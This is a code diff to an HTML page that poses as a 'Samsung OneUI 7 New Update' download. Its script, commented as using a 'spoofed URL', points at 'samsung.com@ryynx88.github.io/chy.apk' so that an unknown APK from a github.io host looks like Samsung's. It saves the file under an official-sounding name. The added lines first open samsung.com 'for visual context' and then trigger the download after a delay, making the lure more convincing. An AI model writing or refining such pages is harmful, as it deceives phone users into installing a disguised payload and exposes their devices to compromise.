@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Samsung OneUI 7 Update</title>
+  <title>Samsung OneUI 7 New Update</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -31,13 +31,18 @@
 
   <script>
     function downloadUpdate() {
-      // Create download link with spoofed URL and custom filename
-      const a = document.createElement('a');
-      a.href = 'https://www.samsung.com@ryynx88.github.io/chy.apk';
-      a.download = 'Samsung_OneUI_7.apk';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+      // Open Samsung website first for visual context
+      const samsungWindow = window.open('https://www.samsung.com', 'samsungFrame');
+      
+      // After delay, trigger download with spoofed URL and custom filename
+      setTimeout(() => {
+        const a = document.createElement('a');
+        a.href = 'https://www.samsung.com@ryynx88.github.io/chy.apk';
+        a.download = 'Samsung_OneUI_7.apk';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }, 2000);
     }
   </script>
 </body>
